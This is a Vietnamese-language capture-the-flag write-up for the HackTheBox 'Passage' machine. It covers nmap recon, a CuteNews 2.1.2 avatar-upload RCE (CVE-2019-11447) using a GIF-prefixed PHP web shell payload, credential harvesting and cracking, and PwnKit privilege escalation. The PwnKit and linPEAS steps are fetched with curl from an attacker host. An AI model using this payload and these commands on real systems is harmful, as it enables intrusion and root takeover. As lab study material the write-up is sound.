![image](https://hackmd.io/_uploads/SJYJ_XqoC.png)

# Machine info and Comment
## Machine info
[Link](https://app.hackthebox.com/machines/275/information)

## Comment
Máy này vận dụng khả năng research CVE và kỹ thuật leo quyền từng làm : )

# Recon
## nmap 
Sau khi nmap ta scan được **2** port ssh, http
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.10.10.206       
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 15:22 EDT
Nmap scan report for 10.10.10.206
Host is up (0.23s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds
```
Từ đây, ta sẽ scan tiếp 2 port này xem có gì để khai thác
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p22,80 -sCV 10.10.10.206
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-26 15:23 EDT
Nmap scan report for 10.10.10.206
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Passage News
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.72 seconds
```
## Port 80 - http
Truy cập vào trang, ta được đưa đến giao diên web

![image](https://hackmd.io/_uploads/Hy9fCxosC.png)

Lướt xuống dưới cùng ta thấy nó được phát triển bởi **CuteNews** CMS

![image](https://hackmd.io/_uploads/rk1HJWosR.png)

CTRL+U và tìm thấy URL `http://10.10.10.206/CuteNews`. Khi truy cập vào ta cũng được điều hướng đến form login cũng như phát hiện version CuteNews là **2.1.2**.

![image](https://hackmd.io/_uploads/ry_FeWssR.png)

# User flag
## Exploit
Thực hiện 1 số inject cơ bản vào 2 trường này nhưng đều không phát hiện gì 

![image](https://hackmd.io/_uploads/ByiykZij0.png)

### Searchsploit
Vì recon ra được version của CMS nên ta sẽ xem có lỗ hổng gì được phát hiện không 

![image](https://hackmd.io/_uploads/B1-CbWsoC.png)

#### CVE-2019-11447
Là CVE phát hiện vấn đề trong CMS 2.1.2 CuteNews thuộc và lỗ hổng **File Upload to RCE**. Quá trình xâm nhập thông qua trường **avatar_file**. Tức là gửi file độc hại với header file signature không được filter
```
#Thay đổi header file tùy ý, ở đây là biến server hiểu là tệp GIFs
payload = "GIF8;\n<?php system($_REQUEST['cmd']) ?>"

#Truyền(upload) vào trường avatar_file
"avatar_file" : (f"{logged_user}.php", payload),
```
Ngoài ra credential cũng bị leak bởi `/CuteNews/cdata/users/lines`. Chúng dược ecode bằng b64 do đó ta có credential của các user khác

![image](https://hackmd.io/_uploads/BJ5_jWisC.png)

Cyberchef

![image](https://hackmd.io/_uploads/ryGco-js0.png)

## Post-Exploit
![image](https://hackmd.io/_uploads/rkCXhWsoC.png)

### Lateral Movement
Như đã phân tích ở trên,ta có thể phát hiện được credential của các user khác. Nên sẽ tìm xem 2 user chứa flag có nằm trong mục bị leak không 

![image](https://hackmd.io/_uploads/SJBz6WoiR.png)

Crack bằng Crackstation 

![image](https://hackmd.io/_uploads/rkQ7aZisA.png)

Switch user và lấy flag

![image](https://hackmd.io/_uploads/HyIh6WjsR.png)

# Root flag
## Exploit
Tải linPeas về máy mục tiêu và chạy file
```
$ cd /tmp
$ curl http://10.10.14.93:8888/linpeas.sh -o linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.s
```
Khi chạy LinPeas ta thấy mục tiêu dễ bị tấn công bởi **CVE-2021-4034** (PwnKit privesc). Đây là một lỗ hổng leo thang đặc quyền trong linux sử dụng [PwnKit](https://github.com/ly4k/PwnKit?ref=avitek.blog). 

![image](https://hackmd.io/_uploads/HylYoWWiC.png)

```
#Máy tấn công 
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit

#Máy mục tiêu
paul@passage:/tmp$ curl http://10.10.14.93:8888/PwnKit -o PwnKit
paul@passage:/tmp$  chmod +x PwnKit
paul@passage:/tmp$  ./PwnKit
root@passage:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
```
## Post-Exploit
```
root@passage:/tmp# cat /root/root.txt
cat /root/root.txt
3c218f18640122b117*******
```

![image](https://hackmd.io/_uploads/SJ6QfGso0.png)
